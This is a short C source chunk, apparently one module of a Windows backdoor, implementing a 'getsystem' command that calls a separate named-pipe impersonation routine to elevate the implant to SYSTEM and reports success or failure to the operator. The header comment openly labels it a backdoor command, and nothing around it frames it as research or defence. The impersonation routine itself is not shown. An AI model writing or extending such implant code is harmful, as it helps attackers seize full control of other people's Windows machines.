// chunk: commands/cmd_getsystem
// depends: privesc/getsystem_pipe
// provides: cmd_getsystem
// note: Backdoor command — elevate to SYSTEM via named pipe impersonation

#ifndef CHUNK_CMD_GETSYSTEM
#define CHUNK_CMD_GETSYSTEM

static int cmd_getsystem(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;

    int result = getsystem_pipe();

    if (result && g_system_token) {
        const char *msg = "OK: Elevated to SYSTEM via named pipe impersonation";
        DWORD len = (DWORD)strlen(msg);
        if (len < *out_len) {
            memcpy(out, msg, len);
            *out_len = len;
        }
        return 0;
    } else {
        const char *msg = "FAIL: Could not elevate to SYSTEM";
        DWORD len = (DWORD)strlen(msg);
        if (len < *out_len) {
            memcpy(out, msg, len);
            *out_len = len;
        }
        return 1;
    }
}

#endif
